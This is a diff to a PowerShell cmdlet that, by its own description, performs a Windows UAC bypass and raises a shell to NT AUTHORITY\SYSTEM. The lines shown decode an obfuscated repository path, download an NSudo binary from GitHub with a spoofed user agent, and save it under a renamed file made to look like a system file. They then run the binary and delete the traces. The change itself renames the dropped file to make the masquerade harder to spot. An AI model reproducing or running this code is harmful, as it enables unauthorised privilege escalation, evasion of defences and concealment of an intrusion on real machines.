@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: Reflection.Assembly {native}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.3.5
+   PS cmdlet Dev version: v1.3.6
 
 .DESCRIPTION 
    This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
@@ -202,18 +202,18 @@ If($Action -ieq "Elevate"){
    
       ## Download and masquerade the required standalone executable
       $Cristovao = "By$!&@p$!a&@" + "ss-Ta&@m$!p&@e&@$!r-Pro&@" + "tec&@ti&@o$!n/ma&@$!i&@n/N$!&@Su&@$!d&@o.e$!x&@e" -join ''
-      If(-not(Test-Path -Path "$Env:TMP\mscorlib.msc" -EA SilentlyContinue)){$Colombo = $Cristovao.Split("&@").split("$!") -Join ''
-         iwr -Uri https://raw.githubusercontent.com/swagkarna/${Colombo} -OutFile $Env:TMP\mscorlib.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+      If(-not(Test-Path -Path "$Env:TMP\sdiagschd.msc" -EA SilentlyContinue)){$Colombo = $Cristovao.Split("&@").split("$!") -Join ''
+         iwr -Uri https://raw.githubusercontent.com/swagkarna/${Colombo} -OutFile $Env:TMP\sdiagschd.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
 
-      If(-not(Test-Path -Path "$Env:TMP\mscorlib.msc" -EA SilentlyContinue)){
+      If(-not(Test-Path -Path "$Env:TMP\sdiagschd.msc" -EA SilentlyContinue)){
 
-         Write-Host "[error] fail to download: $Env:TMP\mscorlib.msc!`n`n" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] fail to download: $Env:TMP\sdiagschd.msc!`n`n" -ForegroundColor Red -BackgroundColor Black
          exit ## Exit @redpill
 
       }Else{## Execute Binary to elevate shell to NT AUTHORITY\SYSTEM
 
-         cd $Env:TMP;.\mscorlib.msc -U:T -P:E $Execute
+         cd $Env:TMP;.\sdiagschd.msc -U:T -P:E $Execute
          cd $Working_Directory ## Return to @UacMe working directory
 
       }
@@ -233,12 +233,12 @@ If($Action -ieq "Elevate"){
 
       ## Build Output Table
       Write-Host "`nUAC State    : $UacStatus"
-      Write-Host "EOP Trigger  : $Env:TMP\mscorlib.msc"
+      Write-Host "EOP Trigger  : $Env:TMP\sdiagschd.msc"
       Write-Host "Execute      : $Execute`n`n"
    
       ## Clean ALL artifacts left behind!
       Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
-      Remove-Item -Path "$Env:TMP\mscorlib.msc" -EA SilentlyContinue -Force
+      Remove-Item -Path "$Env:TMP\sdiagschd.msc" -EA SilentlyContinue -Force
 
    exit ## Exit @UacMe
    }## End of 'admin => system' function!
